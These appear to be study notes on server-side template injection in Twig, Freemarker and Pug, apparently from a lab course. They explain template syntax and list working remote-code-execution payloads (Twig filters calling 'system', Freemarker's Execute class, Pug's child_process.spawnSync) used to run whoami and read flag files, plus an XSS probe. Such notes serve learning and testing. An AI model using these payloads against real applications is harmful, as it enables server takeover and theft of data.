#### Server-side Template Injection

```
Templating Engines
Twig - Discovery and Exploitation
Apache Freemarker - Discovery and Exploitation
Pug - Discovery and Exploitation
Jinja - Discovery and Exploitation
Mustache and Handlebars - Discovery and Exploitation
Halo Case Study
Sprout Forms Case Study

```
###### Expression
double opening curly brackets ({{) instruct the engine that an expression will follow, while double closing curly brackets (}}) indicate that the expression has ended.

###### Statement
These instructions begin with an open curly bracket and a percent sign ({%), which indicates a statement. A statement can perform actions such as looping through a variable or checking with an if statement.


  ###### Template

  ```
  01  Hello {{ name }},
02
03  Thank you for your order! Your items will be shipped out shortly:
04  {% for product in cart %}
05  {{product.name}}
06          Price:  ${{product.price}}
07          Quantity: {{product.quantity}}
08          Total:  ${{product.quantity * product.price}}
09  {% endfor %}____________________
10  Total:          ${{total}}
11
12  {% if cart|length > 1 %}
13  These items{% else %}
14  This item{% endif %} will be shipped to:
15  {{address}}

```

Template Engines

|TEMPLATING ENGINE|	LANGUAGE|	SERVER/CLIENT SIDE|
|-----------------|---------|-------------------|
|Twig	|PHP	|Server Side|
|Freemarker	|Java (usually)	|Server Side|
|Pug/Jade	|JavaScript	|Mostly Server Side|
|Jinja	|Python	|Server Side|
|Handlebars	|JavaScript	|Both|
|Mustache	|Multiple	|Varies|


Mustache -> Handlebars-> jinja-> Freemaker-> Twig-> Pug

```
##### Twig

PHP based

In Twig, {{5*5}} is 25.
 {{5*'5'}} is 25

{{5*'a'}} will produce error.

 Twig supports adding a "-" character to the delimiter to trim whitespace.6 This means if we add a couple of extra spaces, use a statement with the "-" character, and review the output, we should find that the output won't have the extra whitespaces if the target is indeed running Twig.


 1
(Symfony, 2021), https://twig.symfony.com/ ↩︎

2
(Laravel, 2021), https://laravel.com/ ↩︎

3
(Symfony, 2021), https://symfony.com/ ↩︎

4
(Cake Software Foundation, 2021), https://cakephp.org/ ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Model–view–controller ↩︎

6
(Symfony, 2021), https://twig.symfony.com/doc/3.x/templates.html#whitespace-control ↩︎


Twig templates:

```

<h1>{% if not admin %}sudo {% endif %}make me a sandwich, {{name|capitalize}}!</h1>
We are using Twig remotely to generate this template

```

If Loop:

```
{% if not admin %}sudo {% endif %}

```

For Loop:

```
{% for key, child in SECRET_ARRAY %}
{{child}}
{% endfor %}

{% for child in SECRET_ARRAY %}
{{child}}
{% endfor %}

```

##### Twig - Exploitation

Using filters. For example, filters like filter, join, map, reduce, slice, and sort stand out since they might accept functions for additional processing.

From Twig documentation - reduce filter

```
{% set numbers = [1, 2, 3] %}

{{ numbers|reduce((carry, v) => carry + v) }}
{# output 6 #}

```
Arguments for reduce function:

```
Arguments

    arrow: The arrow function
    initial: The initial value
```

RCE:

```
{{[0]|reduce('system','whoami')}}
```

```
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
```



1
(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/index.html ↩︎

2
(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/reduce.html ↩︎

3
(Symfony, 2022) https://twig.symfony.com/doc/3.x/filters/filter.html ↩︎

4
(PHP.net, 2023), https://www.php.net/manual/en/function.system.php ↩︎

```

{{['cat /var/www/flag.txt']|filter('system')|join(',')}}

{{['cat /var/www/flag.txt']|filter('system')}}

{{['whoami']|filter('system')}}

{{[0]|reduce('exec','whoami')}}

{{['id']|map('system')|join(',') }}

{{['id']|map('system')}}

{{['id',1]|sort('system')|join(',')}}

```
##### Freemarker 

Java based

Template:

```
01  <h1>Hello ${name}!</h1>
02  <#if name == "hacker">
03  The top reasons you're great:
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>
07  </#if>

```

Freemaker Expression:

```
<h1>Hello ${name}!</h1>

```
Freemaker Statement:

```
02  <#if name == "hacker">
...
07  </#if>

```

Loop in Freemaker:

```
04    <#list reasons as reason>
05     ${reason?index + 1}: ${reason}
06    </#list>

```
Before 2016, Freemarker required developers to specify if a variable needs to be HTML escaped. It's easy to overlook this setting when displaying variables. After 2016, Freemarker implemented a system that would auto-escape variables if the content type was an HTML document. This means that applications that use Freemarker templates are much more susceptible to XSS than other templating engines. We can observe this by wrapping the name with an HTML tag. We'll set the name to be "<i>Ofira</i>".

Freemaker non-string variable:

```
{
  "reasons": [
    "You give it your all",
    "You try your hardest",
    "You're kind"
  ]
}

```


Sol:

```

${SECRET_STRING}

<#list SECRET_ARRAY as item>
${item}
</#list>

<script>alert(1)</script>

```

###### Freemarker - Discovery

${7*7} -> 49
${7*'7'} -> error

###### Freemarker - Exploitation

class has to implement the TemplateModel class

freemarker.template.utility.Execute

Freemaker execute payload:

```
${"freemarker.template.utility.Execute"?new()("whoami")}

```
Sol:

```
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}

```

##### PUG

Javascript template engine

Pug is commonly integrated with the Express2 framework in a NodeJS3 application.

Pug template:

```
01   h1 Hello, #{name}
02   input(type='hidden' name='admin' value='true')
03 
04   if showSecret
05     - secret = ['❤️','😍', '🤟']
06     p The secrets are: 
07     each val in secret
08       p #{val}
09   else
10    p No secret for you!

```
Pug expression:

```
h1 Hello, #{name}
```
h1 is HTML tag.
Tag attributes:

```
input(type='hidden' name='admin' value='true')

```

If statement in Pug:

```
04   if showSecret
...
09   else
10     p No secret for you!

```

Code in Pug:

```
 - secret = ['❤️','😍', '🤟']
 
```
Using the dash character (-) in front of Pug indicates that the code should be executed by the JavaScript engine and the output should not be displayed (unbuffered code5).

Buffered code:

```
= secret = ['❤️','😍', '🤟']

```
Pug also supports buffered code, which displays the output of the command. We can instruct Pug to run as buffered code by using an equal sign instead of the dash.

Pug expects the first word of a line to be a tag

#{"7"*7} -> <49>


Sol:

```
p #{SECRET_STRING}

```
1
(Lindesay, 2015), https://github.com/pugjs/pug/issues/2184 ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Express.js ↩︎

3
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Node.js ↩︎

4
(Pug, 2021), https://pugjs.org/language/plain-text.html ↩︎

5
(Pug, 2021), https://pugjs.org/language/code.html ↩︎

Searching for "NodeJS execute System Command", we'll find the documentation for the child_process.spawnSync command, which executes system commands on the target. The child_process module isn't accessible by default. Instead, we will need to use the require function to import it.

Check if require exists

```
= require

```

else:

```
= global.process.mainModule.require

```
Storing require as variable:

```
- var require = global.process.mainModule.require
= require('child_process')

```
Executing spawnSync:

```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout

```
Sol:

```
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout

```


1
(Nodejs, 2021), https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options ↩︎
